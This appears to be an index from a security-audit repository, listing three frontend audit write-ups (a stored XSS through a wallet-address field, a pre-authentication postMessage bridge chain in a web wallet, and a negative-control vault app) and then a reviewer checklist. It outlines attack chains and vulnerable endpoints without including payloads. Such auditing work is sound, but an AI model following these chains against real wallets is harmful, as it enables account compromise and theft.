- `examples/hunts/web2/frontend-security-audit/everlyn-stored-xss-2026-08.md` — Next.js Everlyn AI stored XSS via `POST /api/update-wallet-address {metamask_address}` raw without `^0x[a-fA-F0-9]{40}$` allowlist, reflected raw in `GET /api/get-mobile-wallet` (Aug 2026, throttled 0.6s). Lab-verified with `labxss_7268` (`9b2d5621`), offline Vite localStorage PoC distinguishing `textContent` (safe) vs `innerHTML` (vuln) + no CSP.
- `examples/hunts/web2/frontend-security-audit/web-wallet-bridge-compromise-theta-2026-08.md` — Theta Web Wallet pre-auth chain: origin-less postMessage RPC bridge (`Web3Bridge.js`), `/embed?k=&p=` auto-unlock with dead-password modals, `?after-unlock=show-dapp-<url>` iframe injection, WYSINWYS decode gap. Full file:line map + PoC.
- `examples/hunts/web2/frontend-security-audit/nuxaris-secure-vault-spa-2026-08.md` — Nuxaris 2026-08 CRA Vercel secure-vault positive control: sourcemap extraction recipe, vault crypto (PBKDF2 600k/AES-GCM/AAD/WeakMap) vs stored/DOM XSS sweep negatives, prototype-pollution negative, React auto-escape vs vanilla innerHTML, WalletConnect/Helius hygiene.

## Quality Bar
- [ ] Every HIGH has a firing offline PoC or live repro steps against real store?
- [ ] `innerHTML` findings distinguish amplifier (revival) vs inert?
- [ ] No fabricated `eval`/`__proto__` — grep evidence attached?
- [ ] Workflow findings quote exact YAML lines for checkout + interpolation?
- [ ] Fixes are one-line diffs, not prose?
